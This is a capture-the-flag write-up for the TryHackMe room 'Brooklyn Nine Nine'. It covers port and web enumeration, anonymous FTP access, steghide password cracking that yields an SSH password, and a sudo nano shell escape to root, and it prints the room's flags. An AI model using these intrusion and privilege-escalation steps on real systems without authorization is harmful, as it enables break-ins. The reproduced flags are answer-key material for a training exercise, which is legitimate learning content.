---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - steganography
  - sudo-abuse
---

# [Brooklyn Nine Nine]
![Brooklyn Nine Nine logo](logos/brooklyn_nine_nine_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)  

## Description
"This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box."

## Enumeration
### Port scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```
Open ports:  
```
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.130.206
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.7 - 4.19 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```  

### FTP enumeration (`anonymous` login)
```
220 (vsFTPd 3.0.3)
Name (10.129.175.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||28484|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||48821|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |**********************************************************************************************************************************************************|   119      185.93 KiB/s    00:00 ETA
226 Transfer complete.
```

```
cat note_to_jake.txt            
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```  

**Notes**  

* 3 potential users ("jake", "amy", "holt")  
* "jake" user tends to choose weak passwords  

### HTTP enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* No `robots.txt`  
* No `sitemap`  
* No useful findings in `ffuf` or `gobuster` scans
* Web page = static image  
* Source code comment: "Have you ever heard of steganography?"  

**Action(s)**  
:white_check_mark: Download image from web page for further analysis

*Image saved as "brooklyn99.jpg"*

### Vulnerability enumeration
```
searchsploit vsftpd 3.0.3	# Only result: DoS
searchsploit OpenSSH 7.6p1	# Only results for username enumeration
searchsploit httpd 2.4.29	# Only result: DoS
```

## Foothold
### Image examination
```
exiftool brooklyn99.jpg				# No findings
strings brooklyn99.jpg				# No findings
steghide extract -sf brooklyn99.jpg	# Image failed to decompress with blank password
stegcrack brooklyn99.jpg			# Password found: "admin"
steghide extract -sf brooklyn99.jpg	# File extracted to "note.txt"

cat note.txt        
	Holts Password:
	fluffydog12@ninenine
	
	Enjoy!!
```

**Notes**  

* SSH password for "holt" user

### User flag
```
ssh holt@TARGET_IP_ADDRESS
# Enter password when prompted
holt@brookly_nine_nine:~$ ls -al
total 48
	drwxr-xr-x 6 holt holt 4096 May 26  2020 .
	drwxr-xr-x 5 root root 4096 May 18  2020 ..
	-rw------- 1 holt holt   18 May 26  2020 .bash_history
	-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
	-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
	drwx------ 2 holt holt 4096 May 18  2020 .cache
	drwx------ 3 holt holt 4096 May 18  2020 .gnupg
	drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
	-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
	drwx------ 2 holt holt 4096 May 18  2020 .ssh
	-rw------- 1 root root  110 May 18  2020 nano.save
	-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
holt@brookly_nine_nine:~$ cat user.txt
```
??? success "User flag"
	ee11cbb19052e40b07aac0ca060c23ee

## Privilege Escalation
```
sudo -l
	Matching Defaults entries for holt on brookly_nine_nine:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User holt may run the following commands on brookly_nine_nine:
	    (ALL) NOPASSWD: /bin/nano
```

[GTFObins nano](https://gtfobins.org/gtfobins/nano/)

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
ls -al /root
total 32
	drwx------  4 root root 4096 May 18  2020 .
	drwxr-xr-x 24 root root 4096 May 19  2020 ..
	-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
	drwxr-xr-x  3 root root 4096 May 17  2020 .local
	-rw-r--r--  1 root root  148 Aug 17  2015 .profile
	drwx------  2 root root 4096 May 18  2020 .ssh
	-rw-r--r--  1 root root  165 May 17  2020 .wget-hsts
	-rw-r--r--  1 root root  135 May 18  2020 root.txt
cat /root/root.txt
```
??? success "Root flag"
	63a9f0ea7bb98050796b649e85481845

**Tools Used**  
`stegcrack` `steghide`

**Date completed:** 19/04/26  
**Date published:** 19/04/26